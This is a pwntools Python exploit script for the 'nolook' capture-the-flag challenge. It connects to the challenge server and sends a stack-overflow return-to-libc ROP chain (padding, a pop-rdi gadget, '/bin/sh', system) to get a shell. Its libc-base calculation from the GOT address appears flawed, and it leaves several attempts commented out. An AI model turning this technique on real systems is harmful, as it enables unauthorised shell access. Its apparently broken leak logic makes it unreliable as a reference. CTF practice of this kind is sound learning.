#!/usr/bin/env python3

from pwn import *
from binascii import hexlify

exe = ELF("nolook_patched")
libc = ELF("libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("nolook.challs.cyberchallenge.it", 9135)

    return r


def main():
    r = conn()

    # good luck pwning :)

    # ret addr at 26 bytes offset
    read_got_addr = p64(exe.got["read"], endianness = 'little')
    print(b'read.got. ' + read_got_addr)
    print(b'got.read: ' + hexlify(read_got_addr))
    print(b'main: ' + hexlify(p64(exe.symbols["main"], endianness = 'big')))
    print(b'libc.read: ' + hexlify(p64(libc.symbols["read"], endianness = 'big')))

    #print('libc_base_addr' + read_got_addr - read_plt_addr)

   # payload = b'a'*25 + p64(exe.plt["read"], endianness = 'little') # p32(0x00000000004005a7) + b' '+  read_addr

   # # first cycle
   # payload = b'a'*24 + p64(0x004005b7)
   # r.send(payload)
   # print("FIRST CYCLE DONE")

    # leak got.read addr
    read_got_addr = exe.got.read
    read_libc_addr = libc.symbols["read"]
    print(b'read_got_addr after: ' + hexlify(p64(read_got_addr, endianness = 'little')))
    print('libc before: ' + str(libc.address))
    libc.address = read_got_addr - read_libc_addr
    print('libc after: ' + str(libc.address))
    print('plt.read: ' + str(exe.plt.read))

   # shell_string_addr = 0x1b3e9a + libc.address
   # system_addr = 0x000000000004f440 + libc.address

   # print(b'shell_string_addr :' + p64(0x1b3e9a + libc.address)) #0x6A4E42
   # print(b'system_addr :' + p64(0x000000000004f440 + libc.address)) #0x5403E8

    # second cycle      # pop rdi; ret;              # "/bin/sh"                
    payload = b'a'*24 + p64(libc.address + 834795) + p64(libc.address + 136543) + p64(libc.address + 1785498) + p64(libc.address + 324672) #+ p64(0x6A4E42)  #p64(0x004005b7)
    r.send(payload)
    print("SECOND CYCLE DONE")

    r.interactive()


if __name__ == "__main__":
    main()
